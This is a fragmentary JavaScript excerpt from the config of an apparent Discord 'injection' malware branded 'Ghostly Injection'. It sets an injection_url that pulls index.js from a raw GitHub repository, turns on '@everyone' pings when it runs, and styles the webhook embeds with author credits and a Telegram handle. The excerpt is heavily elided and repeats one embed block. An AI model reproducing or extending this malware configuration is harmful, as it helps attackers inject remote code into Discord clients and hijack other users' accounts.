...
const config = {
  ...
  ping_on_run: true, 
  ping_val: '@everyone',
  embed_name: 'Ghostly Injection', 
  embed_icon: 'https://raw.githubusercontent.com/ThiennDanng/Spam-Tele/main/img/ghostly.jpg'.replace(/ /g, '%20'), 
  embed_color: 2895667, 
  injection_url: 'https://raw.githubusercontent.com/ThiennDanng/Spam-Tele/main/index.js', 
  /**
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Ghostly x CNTD (t.me/thiendangg)',
        },
      },
    ],
  };
    ...
    embeds: [
      {
        ...
        footer: {
          text: '🎉・Discord Injection By Ghostly x CNTD (t.me/thiendangg)v',
        },
      },
    ],
  };
